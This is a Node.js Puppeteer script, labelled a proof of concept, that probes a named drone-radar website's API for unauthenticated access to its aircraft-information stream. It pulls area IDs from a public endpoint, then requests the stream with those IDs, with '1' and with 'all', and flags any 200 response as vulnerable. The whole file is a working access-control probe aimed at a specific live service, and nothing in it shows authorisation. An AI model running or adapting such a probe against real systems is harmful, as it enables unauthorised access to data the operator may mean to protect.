const puppeteer = require('puppeteer');

(async () => {
    console.log("Starting Unauthenticated Stream Access PoC with Puppeteer (Detailed)...");
    const browser = await puppeteer.launch({
        headless: "new",
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--ignore-certificate-errors']
    });
    const page = await browser.newPage();

    let validId = null;

    // 1. Fetch Areas to get a Valid ID
    console.log("Step 1: Fetching public area ID from /api/v1/areas...");
    try {
        const response = await page.goto('https://drooniradar.ee/api/v1/areas', { waitUntil: 'networkidle0' });
        const content = await page.evaluate(() => document.body.innerText);

        console.log(`Areas Endpoint Status: ${response.status()}`);

        try {
            const areas = JSON.parse(content);
            if (Array.isArray(areas) && areas.length > 0) {
                validId = areas[0].id;
                console.log(`[SUCCESS] Found Valid Area ID: ${validId} (Name: ${areas[0].name})`);
            } else {
                console.log("[WARN] Areas array empty or invalid.");
            }
        } catch (e) {
            console.log("[ERROR] Failed to parse areas JSON:", content.substring(0, 100));
        }

    } catch (e) {
        console.log("[ERROR] Failed to load areas page:", e.message);
    }

    // IDs to test
    const idsToTest = [];
    if (validId) idsToTest.push(validId);
    idsToTest.push(1);
    idsToTest.push("all"); // Test for firehose
    // No ID (just base URL) is handled separately potentially or implicit

    // 2. Access the stream
    for (const id of idsToTest) {
        const streamUrl = `https://drooniradar.ee/api/v1/aircraft_info?aid=${id}`;
        console.log(`\nStep 2: Testing stream at ${streamUrl}...`);

        const result = await page.evaluate(async (url) => {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000); // 5s wait for data

                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);

                const status = response.status;
                const headers = {};
                response.headers.forEach((val, key) => headers[key] = val);

                let bodyPreview = "";
                try {
                    // Clone execution to read text if not a stream or if error
                    const text = await response.text();
                    bodyPreview = text.substring(0, 500);
                } catch (e) {
                    bodyPreview = "(Stream or Read Error)";
                }

                return { status, headers, bodyPreview };
            } catch (err) {
                return { error: err.toString() };
            }
        }, streamUrl);

        if (result.error) {
            console.log(`  -> Error: ${result.error}`);
        } else {
            console.log(`  -> Status: ${result.status}`);
            console.log(`  -> Body: ${result.bodyPreview}`);

            if (result.status === 200) {
                console.log(`  -> [VULNERABILE] SUCCESS for ID ${id}`);
                break;
            } else if (result.status === 404) {
                console.log(`  -> [404] Resource not found.`);
            } else if (result.status === 401 || result.status === 403) {
                console.log(`  -> [SECURE] Access Denied.`);
            }
        }
    }

    await browser.close();
})();
